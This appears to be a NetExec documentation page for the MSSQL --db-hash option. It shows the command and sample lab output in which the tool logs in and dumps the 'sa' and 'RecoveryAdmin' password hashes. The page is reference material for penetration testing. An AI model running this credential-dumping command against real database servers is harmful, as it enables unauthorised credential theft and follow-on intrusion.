```
description: Dumb MSSQL databases local hashes
```

Using the --db-hash option allows dumping MSSQL databases local hashes as well as the algorithm used to hash them:

```bash
nxc mssql <ip> -u user -p pass --db-hash 
MSSQL       192.168.56.72   54830  SRV22            [*] Windows Server 2022 Build 20348 (2022 RTM 16.0.1000) (name:NAME) (domain:FQDN.local) (EncryptionReq:True) 
MSSQL       192.168.56.72   54830  SRV22            [+] FQDN\user:pass (Pwn3d!)
MSSQL       192.168.56.72   54830  SRV22            [*] Dumping local database users' hashes
MSSQL       192.168.56.72   54830  SRV22            [*] Enumerated logins
MSSQL       192.168.56.72   54830  SRV22            Login Name      Hash type  Hash
MSSQL       192.168.56.72   54830  SRV22            ----------      ---------- --------------
MSSQL       192.168.56.72   54830  SRV22            RecoveryAdmin   SHA-512    0200856c934b19bd8b5ce750bb93402b75cfda0ac00da83fead49c6cbf084558888b40cffeef2f7d4d254075e461c68e85ca72e2bcb0319403465806ccf23e06fb9ac517a0c8
MSSQL       192.168.56.72   54830  SRV22            sa              SHA-512    02001bee31ce178cf9ed0faff6d1d3a6def73decbf5abb24bed8294355d436885213ff63813951b4abf93d0389ee4b4e39362685eb9ce06e910485e696fe82c49d532525b247
```
